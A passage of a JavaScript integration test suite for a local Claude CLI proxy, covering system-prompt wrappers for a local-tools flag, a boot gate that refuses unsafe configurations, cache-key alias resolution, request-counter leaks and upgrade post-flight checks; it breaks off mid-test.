    // A generous explicit ceiling: this attempt already paid the LT_COLLISION_PROBE_MS cost for
    // the forced first-attempt collision before ever reaching this line, and the retry's own
    // boot still has to do the full startup work under whatever host contention is present.
    assert.ok(await ltWait(() => buf.out.includes("listening on") || buf.exit != null, 45000),
      `expected the retry to recover onto a fresh port after the forced collision — ${ltDiag(buf)}`);
    assert.ok(buf.out.includes("listening on"),
      `boot must ultimately succeed after the forced first-attempt collision — ${ltDiag(buf)}`);
    assert.ok(blocker && blocker.address() && blocker.address().port !== port,
      `the recovered boot must be on a DIFFERENT port than the one that was deliberately occupied`);
  } finally {
    child.kill("SIGKILL");
    if (blocker) await new Promise(r => blocker.close(r));
    _ltRmRetry(dir);
  }
});

ltTest("integration: OCP_LOCAL_TOOLS=1 → the -p spawn receives the POSITIVE wrapper (kills the no-op mutation)", async () => {
  if (!LT_POSIX) return; // sh fake — skip on Windows CI
  const dir = ltMkdir(); const cap = join(dir, "sp.txt"); const fake = ltFake(dir);
  const { child, buf, port } = await ltBootFresh({ OCP_LOCAL_TOOLS: "1", CLAUDE_BIN: fake, SP_CAPTURE: cap }, dir);
  try {
    assert.ok(await ltWait(() => buf.out.includes("listening on") || buf.exit != null), `server did not start: ${buf.err.slice(0,200)}`);
    await ltPost(port, { model: "sonnet", messages: [{ role: "user", content: "hi" }] });
    assert.ok(await ltWait(() => _ltExists(cap)), "fake claude was spawned and captured --system-prompt");
    const sp = _ltRead(cap, "utf8");
    assert.ok(sp.includes(LT_POS_MARK), `expected POSITIVE wrapper in --system-prompt, got: ${sp.slice(0,90)}`);
    assert.ok(!sp.includes(LT_NEG_MARK), "positive wrapper must REPLACE the negative one, not append");
  } finally { child.kill("SIGKILL"); _ltRmRetry(dir); }
});

ltTest("integration: flag OFF → the -p spawn receives the EXACT negative wrapper (default path byte-for-byte)", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const cap = join(dir, "sp.txt"); const fake = ltFake(dir);
  const { child, buf, port } = await ltBootFresh({ CLAUDE_BIN: fake, SP_CAPTURE: cap }, dir); // OCP_LOCAL_TOOLS unset
  try {
    assert.ok(await ltWait(() => buf.out.includes("listening on") || buf.exit != null), `server did not start: ${buf.err.slice(0,200)}`);
    await ltPost(port, { model: "sonnet", messages: [{ role: "user", content: "hi" }] });
    assert.ok(await ltWait(() => _ltExists(cap)), "fake claude captured --system-prompt");
    const sp = _ltRead(cap, "utf8");
    // No system messages + no CLAUDE_SYSTEM_PROMPT → the wrapper is passed verbatim.
    assert.equal(sp, `You are accessed via the OCP HTTP proxy. You do NOT have access to any local filesystem, working directory, shell, git status, or machine environment. Do not infer or invent such information from any context you observe. Respond only based on the conversation provided.`);
  } finally { child.kill("SIGKILL"); _ltRmRetry(dir); }
});

ltTest("integration: boot gate REFUSES each unsafe config (multi / non-loopback / anon key)", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const fake = ltFake(dir);
  const cases = [
    { label: "multi", env: { CLAUDE_AUTH_MODE: "multi" } },
    { label: "non-loopback", env: { CLAUDE_BIND: "0.0.0.0" } },
    { label: "anon", env: { PROXY_ANONYMOUS_KEY: "pub" } },
  ];
  try {
    for (const c of cases) {
      const { child, buf } = await ltBootFresh({ OCP_LOCAL_TOOLS: "1", CLAUDE_BIN: fake, ...c.env }, dir);
      try {
        // Wait for `closed`, not `exit`: the assertion below reads buf.err, and stderr is only
        // guaranteed drained at 'close'. This is the ordering #203 was filed for.
        assert.ok(await ltWait(() => buf.closed || buf.spawnErr), `[${c.label}] process never closed — ${ltDiag(buf)}`);
        assert.notEqual(buf.exit, 0, `[${c.label}] must exit non-zero — ${ltDiag(buf)}`);
        assert.ok(/FATAL[\s\S]*OCP_LOCAL_TOOLS/.test(buf.err), `[${c.label}] expected a local-tools FATAL — ${ltDiag(buf)}`);
      } finally {
      child.kill("SIGKILL");
      // bootOnce calls twice sequentially within one test; without waiting for THIS boot's
      // 'close', the next `await bootOnce(...)` could spawn its own child while this one is
      // still mid-teardown — a false "two at once" that ltTest's between-TEST draining doesn't
      // cover, because both boots happen inside a single test body.
      await ltWait(() => buf.closed, 5000);
    }
    }
  } finally { _ltRmRetry(dir); }
});

ltTest("integration: safe single-user config BOOTS past the gate and announces local tools", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const fake = ltFake(dir);
  const { child, buf } = await ltBootFresh({ OCP_LOCAL_TOOLS: "1", CLAUDE_BIN: fake }, dir); // loopback + none
  try {
    // Same race as #199, one line over: "Local tools: ON" (server.mjs:3640) is written 12
    // console.log calls after "listening on" (:3627) — 10 of them in this env, since the
    // SYSTEM_PROMPT and MCP_CONFIG lines are conditional and unset here. Gating on the boot
    // marker and then asserting the announcement can therefore read a buffer holding only the
    // first chunk. Wait for the line actually under assertion. Measured by review at 8/200
    // before this change and 0/200 after — it was the suite's top flake.
    assert.ok(await ltWait(() => buf.out.includes("Local tools: ON") || buf.closed || buf.spawnErr),
      `startup must announce local tools when active — ${ltDiag(buf)}`);
    assert.ok(buf.out.includes("Local tools: ON"),
      `startup must announce local tools when active — ${ltDiag(buf)}`);
    // Nails ltHeadTail's head budget to the thing it exists to capture. Without this the
    // coupling is silent: every added banner line pushes "Local tools: ON" later (Models:
    // alone is ~18B per model), and the day it crosses 900 the diagnostic degrades back to
    // the exact blind spot this PR fixed — with no test going red. Measured offset here is
    // 581 of a 1118B banner, so the margin is ~17 more models.
    const _ltOffset = buf.out.indexOf("Local tools: ON");
    assert.ok(_ltOffset < 900,
      `ltHeadTail's head budget (900B) no longer reaches the local-tools announcement — it is ` +
      `now at byte ${_ltOffset}. The banner grew. Raise the head in ltHeadTail, or ltDiag will ` +
      `silently stop showing the one line that distinguishes "booted" from "refused".`);
  } finally { child.kill("SIGKILL"); _ltRmRetry(dir); }
});

ltTest("integration: TUI mode → flag is announced INERT (not 'ON'), boot not refused", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const fake = ltFake(dir);
  // Non-loopback would normally trip the local-tools gate; under TUI the flag is inert so the
  // gate must NOT fire on its behalf. Use loopback here to isolate TUI's own guards from ours.
  const { child, buf } = await ltBootFresh({ OCP_LOCAL_TOOLS: "1", CLAUDE_TUI_MODE: "true", CLAUDE_BIN: fake }, dir);
  try {
    // Wait for the line actually under assertion, not for a proxy signal. "listening on" and the
    // inert-flag warning are written independently, so gating on the former and then asserting
    // the latter is a race — the flake #199 was filed for. Still bounded by the same timeout, and
    // the boot markers are kept in the predicate so a failed boot ends the wait immediately
    // rather than burning it.
    const ready = await ltWait(() => /ignored in TUI mode/.test(buf.out + buf.err)
                                  || buf.closed || buf.spawnErr);
    assert.ok(ready, `no inert-flag warning appeared — ${ltDiag(buf)}`);
    assert.ok(/ignored in TUI mode/.test(buf.out + buf.err),
      `must warn that OCP_LOCAL_TOOLS is inert under TUI — ${ltDiag(buf)}`);
    assert.ok(!buf.out.includes("Local tools: ON"),
      `must NOT claim local tools are ON in TUI mode (the wrapper is unused there) — ${ltDiag(buf)}`);
  } finally { child.kill("SIGKILL"); _ltRmRetry(dir); }
});

ltTest("integration: toggling OCP_LOCAL_TOOLS invalidates the standard response cache (epoch fold)", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const fake = ltFake(dir); const counter = join(dir, "spawns.txt");
  const req = { model: "sonnet", messages: [{ role: "user", content: "epoch-probe" }] };
  const bootOnce = async (env) => {
    const { child, buf, port } = await ltBootFresh({ CLAUDE_BIN: fake, CLAUDE_CACHE_TTL: "60000", SP_COUNTER: counter, ...env }, dir);
    try {
      assert.ok(await ltWait(() => buf.out.includes("listening on")), `did not start: ${buf.err.slice(0,160)}`);
      _ltWrite(counter, "0"); // reset AFTER boot so boot-time spawns (if any) don't count
      await ltPost(port, req);
      await ltWait(() => (Number(_ltRead(counter, "utf8")) || 0) >= 1, 3000); // give the spawn a beat
      return Number(_ltRead(counter, "utf8")) || 0;
    } finally {
      child.kill("SIGKILL");
      // bootOnce calls twice sequentially within one test; without waiting for THIS boot's
      // 'close', the next `await bootOnce(...)` could spawn its own child while this one is
      // still mid-teardown — a false "two at once" that ltTest's between-TEST draining doesn't
      // cover, because both boots happen inside a single test body.
      await ltWait(() => buf.closed, 5000);
    }
  };
  try {
    const off = await bootOnce({});                       // caches "OK" under epoch(negative)
    const on = await bootOnce({ OCP_LOCAL_TOOLS: "1" });  // same DB, epoch(positive) → must MISS → re-spawn
    assert.equal(off, 1, "first request (cache empty) must spawn claude");
    assert.equal(on, 1, "after toggling the flag the identical request must NOT be served from the old cache (epoch differs → re-spawn)");
  } finally { _ltRmRetry(dir); }
});

// ── active-request counter is paired to the process lifecycle (#180 / #193) ──
// The counter used to be incremented ~40 lines before the spawn, while its only decrement
// (cleanup()) is wired to that proc's events — so any SYNCHRONOUS throw in between leaked +1
// permanently. Driving that fault needs no production hook and no test double: buildCliArgs
// does `args.push("--allowedTools", ...ALLOWED_TOOLS)`, and a spread of enough elements throws
// RangeError synchronously, right inside the window.
//
// Getting there on Linux needs one more turn of the screw. The spread's cost is per ELEMENT,
// so the naive form needs ~124k elements ≈ 250KB in one env var — and Linux caps a single env
// string at MAX_ARG_STRLEN (32 * PAGE_SIZE = 131072 on x86-64), so execve rejects it (E2BIG).
// Encoding around it fails too: empty items are 1 byte each, but `.filter(Boolean)`
// (server.mjs:355) strips them, so ALLOWED_TOOLS ends up empty and the spread branch is never
// entered at all.
//
// The lever is the stack: the throw threshold scales with it, and ltBoot spawns the server, so
// the test owns its argv. Running the child under --stack-size=200 drops the threshold ~5x
// (~24k elements ≈ 48KB), which fits Linux's limit with room to spare.
//
// The threshold is DISCOVERED, in a child under the SAME --stack-size (measuring it in this
// process would report the parent's stack, which is not the one that matters), then taken with
// 1.5x margin and hard-asserted under MAX_ARG_STRLEN. A hard-coded count would silently stop
// triggering on another machine and the test would pass vacuously.
const LT_STACK = 200;                 // child V8 stack (KB); lowers the spread-throw threshold
const LT_MAX_ARG_STRLEN = 131072;     // Linux, x86-64: 32 * 4096
function ltSpreadThrowCount(stackKb) {
  // Binary-search the smallest element count whose spread throws, inside a child running with
  // the stack the server will actually use.
  const src = `const t=n=>{try{const a=[];a.push("--allowedTools",...Array(n).fill("x"));return false}catch{return true}};` +
              `let lo=500,hi=400000;if(!t(hi)){console.log(0)}else{while(lo<hi){const m=(lo+hi)>>1;t(m)?hi=m:lo=m+1}console.log(lo)}`;
  try {
    return Number(String(_ltExecFile(process.execPath, [`--stack-size=${stackKb}`, "-e", src], { encoding: "utf8" })).trim()) || 0;
  } catch { return 0; }
}
async function ltPostStatus(port, body) {
  try {
    const r = await fetch(`http://127.0.0.1:${port}/v1/chat/completions`, {
      method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body),
    });
    return { status: r.status, text: await r.text() };
  } catch { return { status: 0, text: "" }; }
}

console.log("\nactive-request counter pairing (#180 / #193):");

ltTest("integration: a synchronous pre-spawn throw must not leak stats.activeRequests", async () => {
  if (!LT_POSIX) return;
  const thr = ltSpreadThrowCount(LT_STACK);
  assert.ok(thr > 0, `no spread-throw threshold found under --stack-size=${LT_STACK}`);
  const n = Math.ceil(thr * 1.5);                       // margin over the measured threshold
  const entry = Array(n).fill("x").join(",");
  const bytes = Buffer.byteLength(entry);
  // Hard gate: if this ever stops fitting, fail loudly rather than regress to an E2BIG skip.
  assert.ok(bytes <= LT_MAX_ARG_STRLEN,
    `env entry ${bytes}B exceeds MAX_ARG_STRLEN ${LT_MAX_ARG_STRLEN}B — lower LT_STACK`);
  const dir = ltMkdir(); const fake = ltFake(dir);
  const { child, buf, port } = await ltBootFresh({
    CLAUDE_BIN: fake, CLAUDE_ALLOWED_TOOLS: entry,
  }, dir, [`--stack-size=${LT_STACK}`]);
  // Read buf.spawnErr directly rather than attaching a fresh child.on("error", ...) listener
  // here: ltBootFresh's internal wait can already resolve on the collision-probe path before
  // control returns to this line, and Node does not replay an 'error' event to a listener
  // attached after it already fired. ltBoot() attaches its own listener at spawn time
  // (test-features.mjs, inside ltBoot), so buf.spawnErr is populated promptly regardless of
  // when this test itself gets a chance to look at it.
  try {
    const up = await ltWait(() => buf.out.includes("listening on") || buf.spawnErr, 20000);
    assert.ok(up && !buf.spawnErr, `did not start: ${buf.spawnErr ? buf.spawnErr.message : buf.err.slice(0, 300)}`);
    const req = { model: "haiku", messages: [{ role: "user", content: "leak-probe" }] };
    const res = [];
    for (let i = 0; i < 3; i++) res.push(await ltPostStatus(port, req));
    // Non-vacuous on two axes: the requests must actually fail, AND the failure must be the
    // stack overflow from the --allowedTools spread — not some unrelated 500 that a small
    // stack happened to produce. Without the second check a different fault would still leave
    // the counter at 0 and the test would "pass" for the wrong reason.
    assert.deepEqual(res.map(r => r.status), [500, 500, 500],
      `expected the pre-spawn throw to surface as 500s, got ${res.map(r => r.status)}`);
    assert.ok(res.every(r => /call stack size exceeded/i.test(r.text)),
      `500s must come from the spread's RangeError; got: ${res[0].text.slice(0, 200)}`);
    const r = await fetch(`http://127.0.0.1:${port}/status`);
    const active = (await r.json()).requests.active;
    assert.equal(active, 0,
      `3 requests threw before their spawn; the counter must be back to 0, got ${active} (this is the #180 leak)`);
  } finally { child.kill("SIGKILL"); _ltRmRetry(dir); }
});

// ── Cache keys hash the RESOLVED model, not the alias string (#194) ──────────
// models.json is read once at boot, so repointing an alias only takes effect on restart —
// while the SQLite response_cache outlives it. Hashing the raw string would keep serving the
// OLD model's answers under that alias until TTL expiry. Rather than mutate models.json
// mid-suite, these assert the equivalent observable: an alias and its canonical target must
// land on the SAME cache slot, which is true only if the key is resolved before hashing.
// Mutation: change `cacheModel` back to `model` at the three cacheHash call sites in
// server.mjs and both tests go red (2 spawns instead of 1).

// Fake that emits schema-valid JSON, so the structured path caches a VALIDATED result
// (the stock LT_FAKE returns "OK", which fails validation → refusal → never cached).
const LT_FAKE_JSON = `#!/bin/sh
if [ -n "$SP_COUNTER" ]; then c=$(cat "$SP_COUNTER" 2>/dev/null || echo 0); echo $((c+1)) > "$SP_COUNTER"; fi
printf '%s\\n' '{"type":"assistant","message":{"content":[{"type":"text","text":"{\\"ok\\":true}"}]}}'
printf '%s\\n' '{"type":"result"}'
exit 0
`;
function ltFakeJson(dir) { const p = join(dir, "claude-json"); _ltWrite(p, LT_FAKE_JSON); _ltChmod(p, 0o755); return p; }
const LT_SCHEMA = { type: "object", properties: { ok: { type: "boolean" } }, required: ["ok"], additionalProperties: false };

console.log("\nCache key resolves the model alias (#194):");

ltTest("integration: an alias and its canonical target share ONE cache slot (normal path)", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const fake = ltFake(dir); const counter = join(dir, "spawns.txt");
  const { child, buf, port } = await ltBootFresh({ CLAUDE_BIN: fake, CLAUDE_CACHE_TTL: "60000", SP_COUNTER: counter }, dir);
  try {
    assert.ok(await ltWait(() => buf.out.includes("listening on")), `did not start: ${buf.err.slice(0, 200)}`);
    _ltWrite(counter, "0");
    const msgs = [{ role: "user", content: "alias-resolution-probe" }];
    await ltPost(port, { model: "sonnet", messages: msgs });                 // miss → spawn
    await ltWait(() => (Number(_ltRead(counter, "utf8")) || 0) >= 1, 3000);
    await ltPost(port, { model: "claude-sonnet-5", messages: msgs });        // same resolved model → HIT
    await new Promise(r => setTimeout(r, 600));
    assert.equal(Number(_ltRead(counter, "utf8")) || 0, 1,
      "the canonical id must hit the slot the alias populated — a 2nd spawn means the key still hashes the raw alias");
  } finally { child.kill("SIGKILL"); _ltRmRetry(dir); }
});

ltTest("integration: an alias and its canonical target share ONE cache slot (STRUCTURED path)", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const fake = ltFakeJson(dir); const counter = join(dir, "spawns.txt");
  const { child, buf, port } = await ltBootFresh({ CLAUDE_BIN: fake, CLAUDE_CACHE_TTL: "60000", SP_COUNTER: counter }, dir);
  try {
    assert.ok(await ltWait(() => buf.out.includes("listening on")), `did not start: ${buf.err.slice(0, 200)}`);
    _ltWrite(counter, "0");
    const rf = { type: "json_schema", json_schema: { name: "probe", schema: LT_SCHEMA } };
    const msgs = [{ role: "user", content: "structured-alias-probe" }];
    await ltPost(port, { model: "sonnet", messages: msgs, response_format: rf });
    await ltWait(() => (Number(_ltRead(counter, "utf8")) || 0) >= 1, 4000);
    await ltPost(port, { model: "claude-sonnet-5", messages: msgs, response_format: rf });
    await new Promise(r => setTimeout(r, 600));
    assert.equal(Number(_ltRead(counter, "utf8")) || 0, 1,
      "structured cache key must resolve the alias too — this is the path the epoch-only fix missed");
  } finally { child.kill("SIGKILL"); _ltRmRetry(dir); }
});

// MODEL_MAP is models[] + aliases + legacyAliases, so resolving covers legacyAliases for free.
// The three tests above all use `sonnet` (a plain alias); this pins the legacyAlias leg explicitly
// rather than leaving it covered only by construction.
ltTest("integration: a legacyAlias shares ONE cache slot with its canonical target", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const fake = ltFake(dir); const counter = join(dir, "spawns.txt");
  const { child, buf, port } = await ltBootFresh({ CLAUDE_BIN: fake, CLAUDE_CACHE_TTL: "60000", SP_COUNTER: counter }, dir);
  try {
    assert.ok(await ltWait(() => buf.out.includes("listening on")), `did not start: ${buf.err.slice(0, 200)}`);
    _ltWrite(counter, "0");
    const msgs = [{ role: "user", content: "legacy-alias-probe" }];
    await ltPost(port, { model: "claude-haiku-4-5", messages: msgs });            // legacyAlias
    await ltWait(() => (Number(_ltRead(counter, "utf8")) || 0) >= 1, 3000);
    await ltPost(port, { model: "claude-haiku-4-5-20251001", messages: msgs });   // canonical
    await new Promise(r => setTimeout(r, 600));
    assert.equal(Number(_ltRead(counter, "utf8")) || 0, 1,
      "legacyAliases live in MODEL_MAP too — resolving must collapse them onto the canonical slot");
  } finally { child.kill("SIGKILL"); _ltRmRetry(dir); }
});

ltTest("integration: a config change invalidates the STRUCTURED cache too (closes the #177 gap)", async () => {
  if (!LT_POSIX) return;
  const dir = ltMkdir(); const fake = ltFakeJson(dir); const counter = join(dir, "spawns.txt");
  const rf = { type: "json_schema", json_schema: { name: "probe", schema: LT_SCHEMA } };
  const req = { model: "sonnet", messages: [{ role: "user", content: "structured-epoch-probe" }], response_format: rf };
  const bootOnce = async (env) => {
    const { child, buf, port } = await ltBootFresh({ CLAUDE_BIN: fake, CLAUDE_CACHE_TTL: "60000", SP_COUNTER: counter, ...env }, dir);
    try {
      assert.ok(await ltWait(() => buf.out.includes("listening on")), `did not start: ${buf.err.slice(0, 200)}`);
      _ltWrite(counter, "0");
      await ltPost(port, req);
      await ltWait(() => (Number(_ltRead(counter, "utf8")) || 0) >= 1, 4000);
      return Number(_ltRead(counter, "utf8")) || 0;
    } finally {
      child.kill("SIGKILL");
      // bootOnce calls twice sequentially within one test; without waiting for THIS boot's
      // 'close', the next `await bootOnce(...)` could spawn its own child while this one is
      // still mid-teardown — a false "two at once" that ltTest's between-TEST draining doesn't
      // cover, because both boots happen inside a single test body.
      await ltWait(() => buf.closed, 5000);
    }
  };
  try {
    const off = await bootOnce({});                        // caches under epoch(negative wrapper)
    const on = await bootOnce({ OCP_LOCAL_TOOLS: "1" });   // same DB, epoch differs → must re-spawn
    assert.equal(off, 1, "first structured request (cache empty) must spawn claude");
    assert.equal(on, 1, "structured cache must honor CONFIG_EPOCH — before #194 it omitted the epoch entirely and served the stale answer");
  } finally { _ltRmRetry(dir); }
});

// Deterministic close for the ltTest serialization claim: a fact about how many server.mjs
// children were EVER alive at once during this block, not a race against wall-clock luck (see
// the comment on _ltPeakBoots above ltBoot's definition). Registered last in the ltTest chain —
// by construction it only runs once every OTHER ltTest body in this block has settled, so
// _ltPeakBoots holds its final value by the time this reads it. Mutation-proof: bypass the
// _ltQueue chain (return fn() directly from ltTest, or seed the chain with a stale/no-op
// promise) and multiple ltBoot calls overlap, pushing this above 1.
ltTest("integration: ltTest serialization keeps peak concurrent server.mjs children at 1 (#248)", async () => {
  // The predecessor's own test body resolves as soon as its assertions finish, but its
  // `finally { child.kill("SIGKILL"); ... }` only SENDS the signal — 'close' (and this file's
  // own decrement) fires asynchronously afterward. Being queued last guarantees no NEW ltBoot
  // call will happen after this point, but not that the trailing cleanup of the second-to-last
  // one has already landed, so wait for it rather than reading _ltActiveBoots synchronously.
  await ltWait(() => _ltActiveBoots === 0, 5000);
  assert.equal(_ltActiveBoots, 0,
    `all boots in this block must have closed by the time the last queued test runs, got ${_ltActiveBoots} still active`);
  assert.equal(_ltPeakBoots, 1,
    `ltTest must serialize ltBoot-spawned children to 1 at a time; peak observed was ${_ltPeakBoots}`);
});

// ── Upgrade Tests ──
import { runUpgrade, postFlightOk, runPostFlightCheck } from "./scripts/upgrade.mjs";

console.log("\nUpgrade:");

// ── postFlightOk (issue #173) — the acceptance predicate for phase 6 ─────────
// Mutation-proof: revert the version comparison to auth-only and the "stale process
// still holds the port" test below goes green-to-red (that case is the 2026-07-17
// Oracle incident: orphan answered auth.ok=true while serving the OLD version).
test("postFlightOk: rejects a healthy-looking probe that serves the WRONG version (orphan case)", () => {
  assert.equal(postFlightOk({ auth: { ok: true }, version: "3.21.1" }, "v3.22.1"), false);
});

test("postFlightOk: accepts auth.ok + exact target version, tolerating the leading v", () => {
  assert.equal(postFlightOk({ auth: { ok: true }, version: "3.22.1" }, "v3.22.1"), true);
  assert.equal(postFlightOk({ auth: { ok: true }, version: "3.22.1" }, "3.22.1"), true);
});

test("postFlightOk: auth failure rejects regardless of version", () => {
  assert.equal(postFlightOk({ auth: { ok: false }, version: "3.22.1" }, "v3.22.1"), false);
  assert.equal(postFlightOk({ version: "3.22.1" }, "v3.22.1"), false);
  assert.equal(postFlightOk(null, "v3.22.1"), false);
});

test("postFlightOk: unknown/empty target degrades to the auth-only check (never blocks)", () => {
  assert.equal(postFlightOk({ auth: { ok: true }, version: "3.22.1" }, ""), true);
  assert.equal(postFlightOk({ auth: { ok: true }, version: "3.22.1" }, undefined), true);
});

// ── runPostFlightCheck (issue #214, MED-1 on PR #217 review) ────────────────
// `_cmd_update_restart`'s bash-side `cmd_restart` has a swallowed-failure bug (its own
// failure path only echoes and still returns 0), so a failed restart previously reported
// success while the service kept serving the old version — the exact "reports success while
// serving old code" complaint from #214, only partly fixed by detection alone. This function
// is the fix: it polls /health and reuses postFlightOk() (tested above) rather than a second
// hand-rolled predicate. opts.mockProbe/attempts/intervalMs make the retry loop itself
// testable without a live server or real sleeps.
console.log("\nrunPostFlightCheck (#214):");

test("runPostFlightCheck: succeeds immediately when the first probe already matches target", async () => {
  let calls = 0;
  const result = await runPostFlightCheck("v3.26.0", {
    attempts: 5, intervalMs: 0,
    mockProbe: () => { calls++; return { auth: { ok: true }, version: "3.26.0" }; }
  });
  assert.equal(result.ok, true);
  assert.equal(calls, 1, "must not keep polling once the target is already reached");
});

test("runPostFlightCheck: retries past a stale/unreachable probe and succeeds once the target lands", async () => {
  let calls = 0;
  const result = await runPostFlightCheck("v3.26.0", {
    attempts: 5, intervalMs: 0,
    mockProbe: () => {
      calls++;
      if (calls === 1) throw new Error("ECONNREFUSED"); // service mid-restart
      if (calls === 2) return { auth: { ok: true }, version: "3.25.0" }; // old process still holding the port
      return { auth: { ok: true }, version: "3.26.0" }; // new process finally serving
    }
  });
  assert.equal(result.ok, true);
  assert.equal(calls, 3);
});

test("runPostFlightCheck: exhausts attempts and reports ok:false + lastSeen when the target never lands", async () => {
  let calls = 0;
  const result = await runPostFlightCheck("v3.26.0", {
    attempts: 3, intervalMs: 0,
    mockProbe: () => { calls++; return { auth: { ok: true }, version: "3.25.0" }; }
  });
  assert.equal(result.ok, false);
  assert.equal(result.lastSeen, "3.25.0");
  assert.equal(calls, 3, "must try exactly `attempts` times, no more no less");
});

test("runPostFlightCheck: exhausts attempts and reports ok:false + lastSeen:null when totally unreachable", async () => {
  const result = await runPostFlightCheck("v3.26.0", {
    attempts: 3, intervalMs: 0,
    mockProbe: () => { throw new Error("ECONNREFUSED"); }
  });
  assert.equal(result.ok, false);
  assert.equal(result.lastSeen, null);
});

// ── runUpgrade() with kind="restart" (issue #214) ────────────────────────────
// Mirrors the existing "update"-kind placeholder branch. Distinct from "update": no git/npm
// text in the dry-run plan, since this path (unlike "update") never touches git — see the
// doctor.mjs decision-block comment for why that distinction is load-bearing (HIGH-2 on PR
// #217 review: reusing "update" here would have risked pulling unreleased origin/main commits
// onto a production host).
console.log("\nrunUpgrade kind=restart (#214):");

test("runUpgrade restart --dry-run: plan has NO git/npm text, executed:false", async () => {
  const result = await runUpgrade({
    dryRun: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "restart" },
                  current_version: "v3.26.0", latest_version: "v3.26.0" }
  });
  assert.equal(result.executed, false);
  assert.ok(result.plan.some(line => line.includes("restart-only")));
  assert.ok(!result.plan.some(line => /git pull|npm install|git checkout/.test(line)),
    "restart path must never mention git/npm — it doesn't touch either");
});

test("runUpgrade restart (non-dry-run): reports path=restart, changed:true, delegates to bash", async () => {
  const result = await runUpgrade({
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "restart" },
                  current_version: "v3.26.0", latest_version: "v3.26.0" }
  });
  assert.equal(result.path, "restart");
  assert.equal(result.executed, true);
  assert.equal(result.changed, true);
});

test("upgrade --dry-run prints plan, no side effects", async () => {
  const result = await runUpgrade({
    dryRun: true,
    yes: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" }, current_version: "v3.10.0", latest_version: "v3.14.0" }
  });
  assert.equal(result.executed, false);
  assert.ok(result.plan.length > 0);
  assert.ok(result.plan.some(line => line.toLowerCase().includes("snapshot")));
});

test("upgrade noop returns early when current==latest", async () => {
  const result = await runUpgrade({
    yes: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "noop" }, current_version: "v3.14.0", latest_version: "v3.14.0" }
  });
  assert.equal(result.path, "noop");
  assert.equal(result.executed, true);
  assert.equal(result.changed, false);
});

test("upgrade aborts on doctor FAIL", async () => {
  await assert.rejects(async () => {
    await runUpgrade({
      yes: true,
      mockDoctor: { ready_to_upgrade: false, fail_count: 1, next_action: { kind: "fix_oauth" } }
    });
  }, /doctor FAIL/);
});

test("upgrade full path executes 5 phases", async () => {
  const result = await runUpgrade({
    yes: true,
    dryRun: false,
    mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" }
  });
  assert.equal(result.path, "upgrade");
  // Plan asks for 6 phases by name; verify each appears as a phase entry
  const phaseNames = result.phases.map(p => p.name);
  for (const expected of ["pre-flight", "snapshot", "fetch+install", "reconfigure", "restart", "post-flight"]) {
    assert.ok(phaseNames.includes(expected), `missing phase: ${expected}; got ${phaseNames.join(",")}`);
  }
});

// ── --target on the FULL (cross-minor) upgrade path (issue #257) ───────────────────────────────
// `--target` was parsed from argv and threaded into runUpgrade(opts), but opts.target was never
// actually READ anywhere in runUpgrade / runFullUpgrade / runFreshInstall / runRollback — the
// full path always checked out doctor.latest_version regardless of any pin. Fixed narrowly: this
// does NOT let --target bypass doctor's own kind selection (current-vs-latest, decided before
// runFullUpgrade is ever called) — it only decides WHICH tag gets checked out once doctor has
// ALREADY chosen the "upgrade" kind. See scripts/upgrade.mjs's own comment above
// resolveUpgradeTarget() for the full scope reasoning and the (deliberate) divergence from
// PR #255's light-path no-op.
//
// Coverage note (stated explicitly, not left implicit): every test below uses mockExec:true or
// the --dry-run path, matching EVERY existing runFullUpgrade test in this file (see "upgrade
// full path executes 5 phases" right above, and the entire "Restart-unit resolution ... upgrade
// wiring" section later in this file) — none of them ever drive the REAL (non-mockExec) git
// checkout / npm install / curl post-flight branches, because doing so would mean real git/npm
// mutation and a real network probe against whatever happens to be at ~/ocp on the host running
// this suite. The wiring for --target inside those specific real branches (the post-flight
// curl-check target and writeSnapshot's toVersion field) shares the exact same `upgradeTarget`
// local variable as the checkout command and the returned `result.target` field, both of which
// ARE exercised below — but is not independently exercised by an automated test, for the same
// reason nothing else in this function's real branches is.
console.log("\n--target on the full upgrade path (issue #257):");

test("#257 (the money test): --target on a cross-minor upgrade is honored -- checkout uses the pinned tag, not doctor.latest_version", async () => {
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    target: "v3.12.0",
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" },
  });
  const fetchInstallCmds = result.phases.filter(p => p.name === "fetch+install").map(p => p.cmd);
  assert.ok(fetchInstallCmds.some(c => c.includes("checkout v3.12.0")),
    `expected checkout of the PINNED target v3.12.0, got cmds=${JSON.stringify(fetchInstallCmds)}`);
  assert.ok(!fetchInstallCmds.some(c => c.includes("checkout v3.14.0")),
    `must NOT silently checkout doctor.latest_version (v3.14.0) when --target was given; got cmds=${JSON.stringify(fetchInstallCmds)}`);
  assert.equal(result.target, "v3.12.0", `result.target must record the actual pinned target used; got ${JSON.stringify(result.target)}`);
});

test("#257 control: without --target, the full upgrade path still checks out doctor.latest_version (unchanged default)", async () => {
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
    mockDoctor: { ready_to_upgrade: true, next_action: { kind: "upgrade" },
                  current_version: "v3.10.0", latest_version: "v3.14.0" },
  });
  const fetchInstallCmds = result.phases.filter(p => p.name === "fetch+install").map(p => p.cmd);
  assert.ok(fetchInstallCmds.some(c => c.includes("checkout v3.14.0")),
    `expected the unchanged default (checkout latest_version); got cmds=${JSON.stringify(fetchInstallCmds)}`);
  assert.equal(result.target, "v3.14.0", `result.target must fall back to doctor.latest_version; got ${JSON.stringify(result.target)}`);
});

test("#257: --target without a leading 'v' is normalized before checkout (matches the vX.Y.Z tag convention)", async () => {
  const result = await runUpgrade({
    yes: true, dryRun: false, mockExec: true,
